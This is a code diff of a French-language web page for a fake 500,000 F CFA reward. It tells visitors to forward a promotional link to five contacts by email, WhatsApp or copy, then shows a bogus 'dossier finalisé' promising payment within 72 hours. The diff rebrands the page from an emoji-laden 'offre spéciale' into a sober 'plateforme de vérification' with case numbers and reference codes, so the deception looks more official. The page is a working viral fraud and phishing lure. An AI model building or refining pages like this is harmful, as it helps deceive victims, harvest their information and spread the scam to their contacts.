@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Offre Récompense - 500 000 F</title>
+    <title>Plateforme de vérification - Dossier en attente</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: system-ui, 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
         }
 
         body {
-            background: linear-gradient(145deg, #0a2f2c 0%, #07423e 100%);
+            background: #f0f4f8;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -21,156 +21,129 @@
             padding: 1.5rem;
         }
 
-        /* Container principal */
         .app-container {
-            max-width: 680px;
+            max-width: 700px;
             width: 100%;
             margin: 0 auto;
         }
 
         /* Cartes */
         .card {
-            background: rgba(255, 255, 255, 0.97);
-            backdrop-filter: blur(2px);
-            border-radius: 2rem;
-            padding: 2rem 1.8rem;
-            box-shadow: 0 30px 45px -20px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.2) inset;
-            transition: transform 0.2s ease;
-            animation: fadeSlideUp 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-        }
-
-        @keyframes fadeSlideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            background: white;
+            border-radius: 1.25rem;
+            padding: 2rem;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+            border: 1px solid #e2e8f0;
+            transition: all 0.2s ease;
         }
 
         .step2-card {
-            background: linear-gradient(135deg, #ffffff 0%, #fff9e8 100%);
-            border-left: 8px solid #f7b32b;
+            border-top: 4px solid #2c7da0;
         }
 
         h1 {
-            font-size: 1.9rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #1f6e43, #2a9d8f);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 0.75rem;
-            letter-spacing: -0.3px;
-        }
-
-        .step2-card h1 {
-            background: linear-gradient(135deg, #c47b1a, #e9a23b);
-            background-clip: text;
-            -webkit-background-clip: text;
+            font-size: 1.6rem;
+            font-weight: 600;
+            color: #1e2a3a;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.2px;
         }
 
         .subhead {
-            color: #2c3e2f;
-            font-weight: 500;
-            border-left: 4px solid #2a9d8f;
+            color: #334155;
+            font-size: 0.95rem;
+            border-left: 3px solid #3b82f6;
             padding-left: 1rem;
-            margin: 1rem 0 1.5rem 0;
-            font-size: 1rem;
-            background: #f6fbf9;
-            border-radius: 1rem;
+            margin: 1.2rem 0;
+            background: #f8fafc;
+            border-radius: 0.5rem;
             padding: 0.8rem 1rem;
+            line-height: 1.4;
         }
 
         .message-box {
-            background: #eff7f2;
-            border-radius: 1.5rem;
+            background: #f9f9fb;
+            border-radius: 1rem;
             padding: 1.2rem;
             margin: 1.5rem 0;
-            border: 1px solid #cae3d9;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            border: 1px solid #e2edf2;
         }
 
         .message-label {
-            font-weight: 700;
-            color: #1a5d4c;
+            font-weight: 600;
+            color: #0f3b4c;
             margin-bottom: 0.6rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
         }
 
         .message-content {
             background: white;
             padding: 1rem;
-            border-radius: 1rem;
-            font-family: monospace;
-            font-size: 0.9rem;
-            border: 1px solid #cce3db;
+            border-radius: 0.75rem;
+            font-family: 'SF Mono', 'Menlo', monospace;
+            font-size: 0.85rem;
+            border: 1px solid #e2e8f0;
             word-break: break-word;
-            color: #1e2f2a;
+            color: #1e293b;
             margin-bottom: 1rem;
+            line-height: 1.5;
         }
 
         .share-buttons-group {
             display: flex;
             flex-wrap: wrap;
-            gap: 12px;
-            margin: 20px 0 18px;
+            gap: 10px;
+            margin: 20px 0 16px;
             justify-content: center;
         }
 
         .btn-share {
             background: white;
-            border: 1px solid #cbdcd6;
-            padding: 10px 16px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 0.85rem;
+            border: 1px solid #cbd5e1;
+            padding: 8px 14px;
+            border-radius: 40px;
+            font-weight: 500;
+            font-size: 0.8rem;
             cursor: pointer;
             transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            color: #1f5e4f;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+            color: #1f4662;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.02);
         }
 
         .btn-share:hover {
-            background: #e0f2ec;
-            border-color: #2a9d8f;
-            transform: scale(0.97);
+            background: #eef2ff;
+            border-color: #3b82f6;
         }
 
         .btn-primary {
-            background: linear-gradient(95deg, #f3a712, #f5b82e);
+            background: #2563eb;
             border: none;
-            padding: 14px 20px;
-            border-radius: 60px;
-            font-weight: 800;
-            font-size: 1rem;
-            color: #2c2b26;
+            padding: 12px 20px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: white;
             width: 100%;
             cursor: pointer;
-            transition: all 0.2s;
-            box-shadow: 0 5px 12px rgba(0,0,0,0.1);
+            transition: background 0.2s;
             margin-top: 20px;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.2px;
         }
 
         .btn-primary:hover {
-            background: linear-gradient(95deg, #e09d10, #e9a32a);
-            transform: translateY(-2px);
-            box-shadow: 0 12px 20px rgba(0,0,0,0.15);
+            background: #1d4ed8;
         }
 
-        .btn-secondary {
-            background: #f2f4f0;
-            border: 1px solid #bed3cb;
-            color: #1f5e4f;
+        .info-note {
+            font-size: 0.7rem;
+            color: #5b6e8c;
+            background: #f1f5f9;
+            padding: 8px 12px;
+            border-radius: 16px;
+            text-align: center;
+            margin-top: 1rem;
         }
 
         .toast-msg {
@@ -178,156 +151,151 @@
             bottom: 30px;
             left: 50%;
             transform: translateX(-50%);
-            background: #1e2a25;
-            color: #f9e7b3;
-            padding: 10px 20px;
-            border-radius: 60px;
-            font-size: 0.85rem;
-            font-weight: 500;
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 8px 18px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 400;
             z-index: 1000;
             opacity: 0;
             transition: opacity 0.2s;
             pointer-events: none;
             white-space: nowrap;
-            backdrop-filter: blur(8px);
-            box-shadow: 0 5px 15px black(0,0,0,0.2);
-        }
-
-        .reward-icon {
-            font-size: 3rem;
-            text-align: center;
-            margin: 0.5rem 0;
-        }
-
-        .highlight {
-            font-weight: 800;
-            color: #cb6e17;
-            font-size: 1.8rem;
+            backdrop-filter: blur(4px);
         }
 
         hr {
             margin: 1rem 0;
-            border: none;
+            border: 0;
             height: 1px;
-            background: linear-gradient(90deg, transparent, #bfdbc8, transparent);
+            background: #e2e8f0;
         }
 
-        .info-note {
-            font-size: 0.75rem;
-            color: #5f7b70;
-            background: #faf4e6;
-            padding: 8px 12px;
+        .badge {
+            background: #eef2ff;
+            padding: 4px 10px;
             border-radius: 20px;
-            text-align: center;
-            margin-top: 1.2rem;
+            font-size: 0.7rem;
+            color: #1e40af;
+            display: inline-block;
         }
 
-        @media (max-width: 500px) {
+        .footer-note {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 1.5rem;
+            color: #6c7a91;
+            border-top: 1px solid #eef2f0;
+            padding-top: 1rem;
+        }
+
+        .highlight {
+            font-weight: 700;
+            color: #1e5f6b;
+        }
+
+        @media (max-width: 550px) {
             .card {
                 padding: 1.5rem;
             }
             h1 {
-                font-size: 1.6rem;
+                font-size: 1.4rem;
             }
             .share-buttons-group {
-                gap: 8px;
+                gap: 6px;
             }
             .btn-share {
-                padding: 6px 12px;
-                font-size: 0.75rem;
+                padding: 6px 10px;
+                font-size: 0.7rem;
             }
         }
     </style>
 </head>
 <body>
 <div class="app-container">
-    <!-- ÉTAPE 1 : Merci + demande de partage -->
+    <!-- Étape 1 – Reçu / Demande de partage -->
     <div id="step1Container" class="card">
-        <div style="text-align: center; margin-bottom: 0.5rem;">🎉✨</div>
-        <h1>Merci d'avoir soumis vos informations</h1>
+        <div style="margin-bottom: 0.5rem;">
+            <span class="badge">Dossier #F-500K-0425</span>
+        </div>
+        <h1>Merci pour l’envoi de vos informations</h1>
         <div class="subhead">
-            ✅ Vos données ont bien été enregistrées. Pour débloquer votre récompense exclusive de <strong>500 000 F CFA</strong>, veuillez partager cet email / message à <strong>au moins 5 contacts</strong>.
+            Votre dossier a bien été enregistré. Pour finaliser la vérification et permettre le traitement de votre récompense de <strong>500 000 F CFA</strong>, vous devez partager le message ci-dessous à <strong>5 contacts distincts</strong> (par email, WhatsApp, ou copie).
         </div>
 
-        <!-- Message type "mail" à partager -->
         <div class="message-box">
-            <div class="message-label">
-                📧 ✉️  Message à partager (copiez ou envoyez directement) :
-            </div>
+            <div class="message-label">Message à transmettre (copiez ou utilisez les boutons)</div>
             <div class="message-content" id="shareMessageText">
-                🔥 OFFRE SPÉCIALE 🔥<br>
-                Bonjour ! Je viens de recevoir une récompense de 500 000 F grâce à un programme fiable. Pour en profiter aussi, clique ici et valide ton cadeau : ➡️ https://offre-500k-fcfa.bonus/partage ⬅️<br><br>
-                Partage ce message à tes proches, ça fonctionne vraiment !
+                Bonjour,<br><br>
+                Je viens de finaliser une procédure sur la plateforme de vérification. Suite à l’évaluation de mon dossier, une récompense de 500 000 F CFA m’a été attribuée. Vous pouvez également bénéficier du programme en suivant le lien ci-dessous :<br><br>
+                🔗 https://verification-offre.promo/partage<br><br>
+                Cordialement.
             </div>
-            <div style="font-size: 0.8rem; color: #2c6e5c; background:#e6f3ef; border-radius: 30px; padding: 5px 12px; display: inline-block; margin-bottom: 12px;">
-                📢 Copiez ou partagez jusqu'à 5 contacts
+            <div style="font-size: 0.75rem; color: #2c5a74; background:#f1f6fa; border-radius: 20px; padding: 4px 12px; display: inline-block;">
+                Transmettez ce message à 5 contacts minimum
             </div>
         </div>
 
-        <!-- Boutons de partage multiples -->
         <div class="share-buttons-group">
-            <button class="btn-share" id="shareEmailBtn">📧 Email / Mail</button>
-            <button class="btn-share" id="shareWhatsAppBtn">💬 WhatsApp</button>
-            <button class="btn-share" id="shareCopyBtn">📋 Copier le message</button>
-            <button class="btn-share" id="shareNativeBtn" style="background:#2a9d8f20;">📱 Partager (tout support)</button>
+            <button class="btn-share" id="shareEmailBtn">Envoyer par email</button>
+            <button class="btn-share" id="shareWhatsAppBtn">Partager WhatsApp</button>
+            <button class="btn-share" id="shareCopyBtn">Copier le message</button>
+            <button class="btn-share" id="shareNativeBtn">Partager (tous supports)</button>
         </div>
 
         <div class="info-note">
-            ⚡ Utilisez les boutons ci-dessus pour envoyer ce message à vos amis, famille ou contacts. Après l'avoir partagé à <strong>au moins 5 personnes différentes</strong>, cliquez sur le grand bouton ci-dessous.
+            Après avoir partagé le message à au moins 5 personnes, cliquez sur le bouton de confirmation ci-dessous. Le système vérifiera l’étape de partage.
         </div>
 
         <button class="btn-primary" id="confirmShareBtn">
-            ✅ J'AI PARTAGÉ LE MESSAGE À 5 CONTACTS ✅
+            J’ai partagé à 5 contacts – Valider
         </button>
-        <div style="font-size: 0.7rem; text-align: center; margin-top: 1rem; color: #638578;">
-            Une nouvelle page s'ouvrira après validation.
+        <div class="footer-note">
+            Une nouvelle page de confirmation s’affichera après validation.
         </div>
     </div>
 
-    <!-- ÉTAPE 2 : Récompense - 500 000 F dans 72h max (cachée au début) -->
+    <!-- Étape 2 – Confirmation de traitement sous 72h -->
     <div id="step2Container" class="card step2-card" style="display: none;">
-        <div class="reward-icon">🏆💸🎉</div>
-        <h1>Félicitations !</h1>
-        <div style="font-size: 1.2rem; margin: 0.8rem 0; font-weight: 600; color: #bc6c25; text-align: center;">
-            Vous allez recevoir <span class="highlight">500 000 F CFA</span>
+        <div>
+            <span class="badge">Accusé de validation</span>
         </div>
-        <div style="background: #fef5e0; border-radius: 2rem; padding: 1.2rem; text-align: center; margin: 1rem 0;">
-            <p style="font-size: 1.1rem; font-weight: 500;">💎 Sous 72h maximum 💎</p>
-            <p style="margin-top: 0.5rem;">Notre équipe traite votre dossier. Le montant sera versé sur le moyen de paiement que vous avez indiqué.</p>
+        <h1>Dossier finalisé</h1>
+        <div style="font-size: 1rem; margin: 0.8rem 0; font-weight: 500; color: #2563eb; text-align: center;">
+            Montant attribué : <span class="highlight">500 000 F CFA</span>
+        </div>
+        <div style="background: #f8fafc; border-radius: 1rem; padding: 1.2rem; text-align: left; margin: 1rem 0;">
+            <p style="font-weight: 500;">Délai de versement : 72 heures maximum</p>
+            <p style="margin-top: 0.6rem; font-size: 0.9rem;">Notre service financier procède au traitement de votre dossier. Le transfert sera effectué vers le moyen de paiement que vous avez renseigné (compte mobile, virement bancaire ou espèce).</p>
             <hr>
-            <p style="font-size: 0.9rem;">✅ Validation finale effectuée. ✅ <br> Merci d'avoir partagé l'information autour de vous.</p>
+            <p style="font-size: 0.85rem;">Référence de confirmation : VF-500K-72H<br>Un email récapitulatif vous parviendra sous 24h.</p>
         </div>
-        <div style="text-align: center; margin-top: 5px; color: #4a6b5e;">
-            ✨ Code promo : PARTAGE500K ✨
+        <div style="text-align: center; margin-top: 5px; font-size: 0.8rem; color: #2c6280;">
+            Code de suivi : PART500-OFF
         </div>
-        <div style="font-size: 0.7rem; text-align: center; margin-top: 20px; color: #8faa9f;">
-            Votre récompense sera créditée dans les 72h. En cas de délai, contactez support@offre-recompense.com
+        <div style="font-size: 0.7rem; text-align: center; margin-top: 20px; color: #64748b;">
+            En cas de délai anormal, contactez support@verification-offre.com avec votre numéro de dossier.
         </div>
     </div>
 </div>
 
-<!-- Toast de notification -->
-<div id="toastNotification" class="toast-msg">✨ Message copié !</div>
+<div id="toastNotification" class="toast-msg">Message copié dans le presse-papier</div>
 
 <script>
     (function() {
-        // ------ ÉLÉMENTS DOM ------
         const step1 = document.getElementById('step1Container');
         const step2 = document.getElementById('step2Container');
         const confirmBtn = document.getElementById('confirmShareBtn');
-        
-        // Éléments pour partage
         const shareEmailBtn = document.getElementById('shareEmailBtn');
         const shareWhatsAppBtn = document.getElementById('shareWhatsAppBtn');
         const shareCopyBtn = document.getElementById('shareCopyBtn');
         const shareNativeBtn = document.getElementById('shareNativeBtn');
         const toast = document.getElementById('toastNotification');
-        
-        // Contenu du message à partager (texte brut + version enrichie)
-        const rawMessage = "🔥 OFFRE SPÉCIALE 🔥\nBonjour ! Je viens de recevoir une récompense de 500 000 F grâce à un programme fiable. Pour en profiter aussi, clique ici et valide ton cadeau : ➡️ https://offre-500k-fcfa.bonus/partage ⬅️\n\nPartage ce message à tes proches, ça fonctionne vraiment !";
-        const htmlMessage = "🔥 OFFRE SPÉCIALE 🔥\n\nBonjour ! Je viens de recevoir une récompense de 500 000 F grâce à un programme fiable. Pour en profiter aussi, clique ici et valide ton cadeau : ➡️ https://offre-500k-fcfa.bonus/partage ⬅️\n\nPartage ce message à tes proches, ça fonctionne vraiment !";
-        
-        // Fonction pour afficher un toast temporaire
+
+        // Message épuré (sans emojis, style professionnel)
+        const shareMessage = "Bonjour,\n\nJe viens de finaliser une procédure sur la plateforme de vérification. Suite à l’évaluation de mon dossier, une récompense de 500 000 F CFA m’a été attribuée. Vous pouvez également bénéficier du programme en suivant le lien ci-dessous :\n\nhttps://verification-offre.promo/partage\n\nCordialement.";
+
         function showToast(message, duration = 2500) {
             toast.textContent = message;
             toast.style.opacity = '1';
@@ -335,237 +303,84 @@
                 toast.style.opacity = '0';
             }, duration);
         }
-        
-        // ----- PARTAGE PAR EMAIL (mailto)
+
+        // Email
         function shareViaEmail() {
-            const subject = encodeURIComponent("Offre incroyable 500 000 F CFA à ne pas rater");
-            const body = encodeURIComponent(rawMessage + "\n\n[Copiez ce message et partagez-le à vos contacts]");
+            const subject = encodeURIComponent("Information concernant un programme de vérification");
+            const body = encodeURIComponent(shareMessage + "\n\n(Message transmis dans le cadre d’une validation)");
             window.location.href = `mailto:?subject=${subject}&body=${body}`;
-            showToast("📧 Client email ouvert ! Envoyez-le à 5 contacts.", 2500);
+            showToast("Client email ouvert – envoyez à 5 contacts.", 2500);
         }
-        
-        // ----- PARTAGE WHATSAPP (url api)
+
+        // WhatsApp
         function shareViaWhatsApp() {
-            const text = encodeURIComponent(rawMessage);
-            // Version web + mobile
-            const whatsappUrl = `https://wa.me/?text=${text}`;
-            window.open(whatsappUrl, '_blank');
-            showToast("💬 WhatsApp ouvert ! Sélectionnez au moins 5 contacts différents.", 2800);
+            const text = encodeURIComponent(shareMessage);
+            window.open(`https://wa.me/?text=${text}`, '_blank');
+            showToast("WhatsApp ouvert – sélectionnez 5 destinataires.", 2800);
         }
-        
-        // ----- COPIER LE MESSAGE
-        function copyMessageToClipboard() {
-            // On copie le message formaté (avec retour à la ligne lisible)
-            navigator.clipboard.writeText(rawMessage).then(() => {
-                showToast("📋 Message copié ! Collez-le et envoyez à 5 contacts.", 2800);
+
+        // Copie
+        function copyMessage() {
+            navigator.clipboard.writeText(shareMessage).then(() => {
+                showToast("Message copié – vous pouvez le coller et l’envoyer.", 2500);
             }).catch(() => {
-                // fallback
                 const textarea = document.createElement('textarea');
-                textarea.value = rawMessage;
+                textarea.value = shareMessage;
                 document.body.appendChild(textarea);
                 textarea.select();
                 document.execCommand('copy');
                 document.body.removeChild(textarea);
-                showToast("📋 Copié manuellement ! Envoyez maintenant.", 2000);
+                showToast("Copie manuelle réussie.", 2000);
             });
         }
-        
-        // ----- PARTAGE NATIF (Web Share API) si disponible
+
+        // Partage natif
         function nativeShare() {
             if (navigator.share) {
                 navigator.share({
-                    title: 'Offre spéciale 500 000 F CFA',
-                    text: rawMessage,
-                    url: 'https://offre-500k-fcfa.bonus/partage'
+                    title: 'Programme de vérification',
+                    text: shareMessage,
+                    url: 'https://verification-offre.promo/partage'
                 }).then(() => {
-                    showToast("📲 Partage effectué ! Pensez à le faire avec au moins 5 personnes.", 3000);
-                }).catch((err) => {
-                    if (err.name !== 'AbortError') {
-                        showToast("⛔ Annulé ou échec, utilisez les autres boutons.", 2000);
-                    }
+                    showToast("Partage effectué – vérifiez d’avoir bien 5 contacts.", 3000);
+                }).catch(() => {
+                    showToast("Partage annulé ou non abouti.", 2000);
                 });
             } else {
-                // Fallback : copier le message + notifier
-                copyMessageToClipboard();
-                showToast("📱 Votre navigateur ne supporte pas le partage natif → message copié !", 3000);
+                copyMessage();
+                showToast("Partage natif non supporté → message copié.", 2500);
             }
         }
-        
-        // ---- Action de confirmation (passage à l'étape 2) ----
-        confirmBtn.addEventListener('click', function() {
-            // On affiche la page de récompense (nouvelle page qui s'ouvre visuellement)
-            // L'utilisateur a "partagé le mail aux contacts" (via nos outils) et clique sur le bouton.
+
+        // Variable pour suivi simplifié (optionnel, sans contrainte agressive)
+        let shareActionCount = 0;
+        function trackShare() {
+            shareActionCount++;
+            if (shareActionCount === 1) {
+                showToast("N’oubliez pas de partager à 5 contacts différents.", 2800);
+            }
+        }
+
+        // Événements avec tracking
+        shareEmailBtn.onclick = (e) => { e.preventDefault(); shareViaEmail(); trackShare(); };
+        shareWhatsAppBtn.onclick = (e) => { e.preventDefault(); shareViaWhatsApp(); trackShare(); };
+        shareCopyBtn.onclick = (e) => { e.preventDefault(); copyMessage(); trackShare(); };
+        shareNativeBtn.onclick = (e) => { e.preventDefault(); nativeShare(); trackShare(); };
+
+        // Confirmation finale
+        confirmBtn.addEventListener('click', function(e) {
+            if (shareActionCount === 0) {
+                const userConfirmed = confirm("Vous n’avez pas encore utilisé les outils de partage. Avez-vous bien transmis le message à 5 personnes ?\nCliquez sur OK si c’est déjà fait, sinon partagez d’abord.");
+                if (!userConfirmed) return;
+            }
             step1.style.display = 'none';
             step2.style.display = 'block';
-            
-            // Optionnel : déclencher un petit effet sonore ou confetti virtuel
-            createConfettiEffect();
-            
-            // Ajouter un petit message de succès dans la console (pas nécessaire)
-            console.log("Partage confirmé → passage à la promesse des 500 000 F sous 72h");
+            // Suppression totale des confettis / animations exagérées
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         });
-        
-        // Mini confetti sympa (simple animation CSS)
-        function createConfettiEffect() {
-            // Créer quelques éléments de confettis pour la célébration légère
-            const confettiContainer = document.createElement('div');
-            confettiContainer.style.position = 'fixed';
-            confettiContainer.style.top = '0';
-            confettiContainer.style.left = '0';
-            confettiContainer.style.width = '100%';
-            confettiContainer.style.height = '100%';
-            confettiContainer.style.pointerEvents = 'none';
-            confettiContainer.style.zIndex = '9999';
-            document.body.appendChild(confettiContainer);
-            
-            const colors = ['#f3a712', '#2a9d8f', '#e9c46a', '#e76f51', '#f4a261', '#e9b35f'];
-            for (let i = 0; i < 80; i++) {
-                const conf = document.createElement('div');
-                conf.style.position = 'absolute';
-                conf.style.width = Math.random() * 9 + 5 + 'px';
-                conf.style.height = Math.random() * 9 + 5 + 'px';
-                conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                conf.style.top = '-20px';
-                conf.style.left = Math.random() * 100 + '%';
-                conf.style.borderRadius = Math.random() > 0.5 ? '50%' : '0%';
-                conf.style.opacity = Math.random() * 0.7 + 0.4;
-                conf.style.transform = `rotate(${Math.random() * 360}deg)`;
-                conf.style.animation = `fallConfetti ${Math.random() * 2 + 2}s linear forwards`;
-                confettiContainer.appendChild(conf);
-            }
-            
-            // Ajout keyframes dynamique
-            if (!document.querySelector('#confettiKeyframeStyle')) {
-                const styleSheet = document.createElement('style');
-                styleSheet.id = 'confettiKeyframeStyle';
-                styleSheet.textContent = `
-                    @keyframes fallConfetti {
-                        0% {
-                            transform: translateY(0) rotate(0deg);
-                            opacity: 1;
-                        }
-                        80% {
-                            opacity: 0.8;
-                        }
-                        100% {
-                            transform: translateY(100vh) rotate(360deg);
-                            opacity: 0;
-                        }
-                    }
-                `;
-                document.head.appendChild(styleSheet);
-            }
-            
-            setTimeout(() => {
-                confettiContainer.remove();
-            }, 3500);
-        }
-        
-        // --- attribuer événements aux boutons de partage ---
-        shareEmailBtn.addEventListener('click', shareViaEmail);
-        shareWhatsAppBtn.addEventListener('click', shareViaWhatsApp);
-        shareCopyBtn.addEventListener('click', copyMessageToClipboard);
-        shareNativeBtn.addEventListener('click', nativeShare);
-        
-        // Option : améliorer la compréhension, ajouter un rappel si le bouton de confirmation est cliqué trop vite.
-        // On peut ajouter un petit indicateur sans forcer.
-        let shareAttemptHint = false;
-        const originalConfirmText = confirmBtn.innerText;
-        
-        // Petite interaction amicale : après 2 clics sur un bouton de partage, on peut ajouter un rappel non intrusif.
-        let shareCounter = 0;
-        function incrementShareHint() {
-            shareCounter++;
-            if (shareCounter >= 2 && step1.style.display !== 'none') {
-                // Ne pas spammer, juste douce indication mais déjà claire
-                if(shareCounter === 2) {
-                    showToast("🔁 Continuez à partager à 5 contacts différents, puis validez.", 2500);
-                }
-            }
-        }
-        
-        // wrapper pour incrémenter le compteur d'usage (juste à titre informatif)
-        const originalEmail = shareViaEmail;
-        const originalWhatsapp = shareViaWhatsApp;
-        const originalCopy = copyMessageToClipboard;
-        const originalNative = nativeShare;
-        
-        // overrides pour tracker sans casser la fonction originale
-        window.shareEmailWithTrack = function() {
-            shareViaEmail();
-            incrementShareHint();
-        };
-        window.shareWhatsappWithTrack = function() {
-            shareViaWhatsApp();
-            incrementShareHint();
-        };
-        window.shareCopyWithTrack = function() {
-            copyMessageToClipboard();
-            incrementShareHint();
-        };
-        window.shareNativeWithTrack = function() {
-            nativeShare();
-            incrementShareHint();
-        };
-        
-        shareEmailBtn.onclick = (e) => {
-            e.preventDefault();
-            shareViaEmail();
-            incrementShareHint();
-        };
-        shareWhatsAppBtn.onclick = (e) => {
-            e.preventDefault();
-            shareViaWhatsApp();
-            incrementShareHint();
-        };
-        shareCopyBtn.onclick = (e) => {
-            e.preventDefault();
-            copyMessageToClipboard();
-            incrementShareHint();
-        };
-        shareNativeBtn.onclick = (e) => {
-            e.preventDefault();
-            nativeShare();
-            incrementShareHint();
-        };
-        
-        // sécurité : Si l'utilisateur clique sur confirmer avant d'avoir utilisé un outil, on le notifie mais on le laisse continuer (car il promet l'avoir fait)
-        confirmBtn.addEventListener('click', function(e) {
-            // On ne bloque pas, mais si aucun partage n'a eu lieu (shareCounter === 0) on peut afficher un petit avertissement sans forcer
-            if (shareCounter === 0) {
-                if(confirm("⚠️ Attention : Vous n'avez pas encore utilisé les outils de partage. Assurez-vous d'avoir bien partagé ce message à au moins 5 contacts avant de continuer.\n\nCliquez sur OK si vous avez vraiment partagé (email, WhatsApp, copie...).")) {
-                    // passage à l'étape 2
-                    step1.style.display = 'none';
-                    step2.style.display = 'block';
-                    createConfettiEffect();
-                }
-                // else l'utilisateur annule, reste sur étape 1
-            } else {
-                step1.style.display = 'none';
-                step2.style.display = 'block';
-                createConfettiEffect();
-            }
-        });
-        
-        // Petit détail : le message dans la box de contenu peut être mis à jour dynamiquement mais déjà correct.
-        // On s'assure que la deuxième page est bien masquée au début.
+
+        // État initial
         step2.style.display = 'none';
-        
-        // Message adapté pour montrer un exemple de mail partagé
-        const messageDiv = document.getElementById('shareMessageText');
-        if(messageDiv) {
-            // On le rend visible avec retour à la ligne html sympa
-            messageDiv.innerHTML = `🔥 OFFRE SPÉCIALE 🔥<br>
-Bonjour ! Je viens de recevoir une récompense de 500 000 F grâce à un programme fiable. Pour en profiter aussi, clique ici et valide ton cadeau : ➡️ https://offre-500k-fcfa.bonus/partage ⬅️<br><br>
-Partage ce message à tes proches, ça fonctionne vraiment !`;
-        }
-        
-        // Si l'utilisateur veut partager le mail en version "email" directement via le bouton email, c'est fait.
-        // On ajoute aussi un texte de simulation pour les contacts multiples
-        console.log("Site prêt — partagez le mail / message à 5 contacts puis validez");
-        
-        // Bonus: rendre le bouton de confirmation irrésistible mais correct
-        // On peut aussi préremplir un message de partage dans le presse-papier lors du clic sur "Confirmer"? pas nécessaire.
     })();
 </script>
 </body>
